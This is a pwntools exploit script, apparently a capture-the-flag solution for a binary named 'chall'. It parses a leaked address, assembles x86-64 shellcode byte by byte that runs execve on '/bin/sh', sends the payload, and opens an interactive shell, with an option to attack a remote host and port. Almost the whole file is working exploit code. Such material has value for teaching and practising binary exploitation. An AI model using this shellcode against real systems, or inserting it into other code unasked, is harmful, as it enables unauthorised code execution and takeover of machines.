#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
# context.update(arch='i386')
context(os='linux', arch='amd64', log_level='debug')
exe = './chall'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  #('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.readline()
addr_data = io.readline()
addr = int(addr_data.split(b"[")[1].split(b"]")[0][2:], 16)
io.readline()

xor_esi_esi = b"\x31\xf6"
mul_esi = b"\xf7\xe6"
mov_rdi_bin_sh_addr = b"\x48\xbf" + p64(addr)
mov_al_59 = b"\xb0\x3b"
syscall = b"\x0f\x05"
jmp_short_8 = b"\xeb\x08"

bin_sh = b"/bin/sh\x00"
shellcode_addr = p64(addr + len(bin_sh))
payload = bin_sh + xor_esi_esi + mul_esi + mov_rdi_bin_sh_addr + jmp_short_8 + shellcode_addr + mov_al_59 + syscall

print("[+] Payload Length : [%d]" % (len(payload)))
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

